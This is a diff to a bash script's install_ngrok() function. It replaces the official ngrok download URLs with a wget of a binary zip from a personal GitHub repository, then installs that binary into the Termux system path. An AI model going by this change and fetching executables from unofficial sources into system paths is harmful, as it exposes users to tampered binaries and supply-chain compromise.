@@ -233,18 +233,32 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
-		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
-		fi
+        case `dpkg --print-architecture` in 
+        aarch64)
+            architectureURL="arm64" ;;
+        arm)
+            architectureURL="arm" ;;
+        armhf)
+            architectureURL="armhf" ;;
+        amd64)
+            architectureURL="amd64" ;;
+        i*86)
+            architectureURL="i386" ;;
+        x86_64)
+        architectureURL="amd64" ;;
+        *)
+        echo "Arquitectura desconocida"
+        esac
+        wget "https://github.com/tchelospy/NgrokTest/blob/master/ngrok-stable-linux-${architectureURL}.zip?raw=true" -O ngrok.zip
+        unzip ngrok.zip
+		chmod 777 ngrok
+        cp ngrok .server/ngrok
+        cp ngrok /data/data/com.termux/files/usr/bin/ngrok
+        chmod 700 .server/ngrok
+        chmod 700 /data/data/com.termux/files/usr/bin/ngrok
+        rm ngrok ngrok.zip
 	fi
-
+	
 }
 
 ## Exit message
